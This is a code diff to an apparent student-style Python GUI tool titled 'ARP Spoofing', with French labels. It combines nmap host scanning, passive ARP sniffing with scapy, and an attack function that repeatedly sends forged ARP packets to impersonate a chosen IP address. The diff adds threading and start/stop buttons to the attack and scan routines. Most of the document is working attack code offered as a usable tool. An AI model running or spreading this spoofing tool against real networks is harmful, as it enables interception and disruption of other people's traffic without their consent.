@@ -3,6 +3,50 @@ import nmap
 import netifaces
 from scapy.all import *
 import time
+import threading
+from scapy.all import sniff
+from tkinter import ttk
+
+
+global liste_pas
+
+liste_pas = []
+global is_sniffing
+is_sniffing=False
+
+
+
+
+
+
+# Define a function to process captured packets
+def packet_handler(packet):
+    global liste_pas
+    if packet[ARP].op == 1:  # ARP request
+        src_ip = packet[ARP].psrc
+        src_mac = packet[ARP].hwsrc
+        if (src_ip, src_mac) not in liste:
+            liste_pas.append((src_ip, src_mac))
+            print(f"IP: {src_ip}, MAC: {src_mac}")
+            liste_ip_1.insert(tk.END, f"IP: {src_ip}, MAC: {src_mac}")
+ 
+# Sniff only TCP packets on the default network interface
+
+
+def stop_passive():
+    global is_sniffing
+    is_sniffing = False
+
+
+def passive():
+    global is_sniffing
+    is_sniffing = True
+    def snif():
+        while is_sniffing:
+              sniff(filter='arp', prn=packet_handler)
+    thread = threading.Thread(target=snif)
+    thread.start()
+
 
 
 def get_interface_info():
@@ -28,8 +72,17 @@ def scan():
     nm.scan(hosts=a, arguments='-sP')
     for host in nm.all_hosts():
         liste.append(str(host)  +' '+  str(nm[host].hostname()))
+    progressbar.step(20)
+
     for ip in liste:
         liste_ip_1.insert(tk.END, ip)
+
+def start_scan():
+    scan_thread = threading.Thread(target=scan)
+    scan_thread.start()
+
+
+
 
 def get_mac_address():
     my_macs = [get_if_hwaddr(i) for i in get_if_list()]
@@ -37,27 +90,37 @@ def get_mac_address():
         if(mac != "00:00:00:00:00:00"):
             return mac
 
-#    ip = liste_if.get(liste_if.curselection())
-    #liste_ip_1.insert(tk.END, ip[0])
 
 def decimal_to_cidr(ip, masque):
-    # Convertir l'IP et le masque en listes d'entiers
     ip_octets = [int(octet) for octet in ip.split('.')]
     masque_octets = [int(octet) for octet in masque.split('.')]
-
-    # Calculer le nombre de bits à 1 dans le masque de sous-réseau
     bits_a_un = sum([bin(octet).count('1') for octet in masque_octets])
 
-    # Construire la notation CIDR
     cidr = f"{ip}/{bits_a_un}"
 
     return cidr
+
+is_sending = False
+
+
+
 def attack():
-    my_mac = get_mac_address()
-    packet = Ether()/ARP(op="who-has", hwsrc=my_mac, psrc=ip_1.get(), pdst=ip_2.get())
-    while True:
-        time.sleep(0.2)
-        sendp(packet, loop=1, inter=0.2)
+    global is_sending
+    is_sending = True
+    def send_packet():
+        my_mac = get_mac_address()
+        packet = Ether()/ARP(op="who-has", hwsrc=my_mac, psrc=ip_1.get(), pdst=ip_2.get())
+        while is_sending:
+            time.sleep(0.2)
+            sendp(packet,verbose=False)
+    thread = threading.Thread(target=send_packet)
+    thread.start()
+
+
+
+def stop_attack():
+    global is_sending
+    is_sending = False
 
 liste = []
 fenetre = tk.Tk()
@@ -66,10 +129,14 @@ fenetre.title("ARP Spoofing")
 label_0 = tk.Label(fenetre, text="Adresse IP à imiter :")
 label_0.grid(row=0, column=0, padx=10, pady=5)
 
-liste_ip_1 = tk.Listbox(fenetre, selectmode=tk.SINGLE)
+liste_ip_1 = tk.Listbox(fenetre, width=70,height=20,selectmode=tk.SINGLE)
+
+
 for ip in liste:
     liste_ip_1.insert(tk.END, ip)
-liste_ip_1.grid(row=0, column=0, padx=10, pady=5)
+liste_ip_1.grid(row=0, column=0, padx=10, pady=5,sticky=tk.NSEW)
+scrollbar = tk.Scrollbar(fenetre, orient=tk.VERTICAL,command=liste_ip_1.yview)
+scrollbar.grid(row=0,column=1,sticky=tk.NS)
 
 
 label_1 = tk.Label(fenetre, text="IP à imiter :")
@@ -91,9 +158,17 @@ for inf in listeif:
     liste_if.insert(tk.END, inf)
 liste_if.grid(row=3, column=0, padx=10, pady=5)
 
-button_scan = tk.Button(fenetre, text="Lancer le scan", command=scan)
+button_scan = tk.Button(fenetre, text="Lancer le scan", command=start_scan)
 button_scan.grid(row=5, column=0, columnspan=2, padx=10, pady=10)
 
+button_stop = tk.Button(fenetre, text="Arreter l'attaque", command=stop_attack)
+button_stop.grid(row=6, column=0, columnspan=2, padx=10, pady=10)
+
+button_pass = tk.Button(fenetre, text="Lancer le scan passive", command=passive)
+button_pass.grid(row=7, column=0, columnspan=2, padx=10, pady=10)
+
+button_stop_pass = tk.Button(fenetre, text="stop scan passive", command=stop_passive)
+button_stop_pass.grid(row=8, column=0, columnspan=2, padx=10, pady=10)
 
 
 
